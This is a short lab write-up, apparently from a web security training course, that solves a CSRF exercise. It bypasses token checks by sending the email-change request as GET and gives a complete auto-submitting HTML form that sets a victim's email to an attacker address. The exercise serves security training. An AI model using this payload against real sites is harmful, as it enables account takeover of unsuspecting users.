This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter 

# Solution

Change email -> Burp Repeater -> Change request method to GET and remove CSRF to test CSRF token validation

Bypass using GET request without supplying CSRF token

```html
<form id="autosubmit" action="https://0ab80045043e2279809044b90005007d.web-security-academy.net/my-account/change-email" enctype="application/x-www-form-urlencoded" method="GET">
 <input name="email" type="hidden" value="some-other-email@attacker.com" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```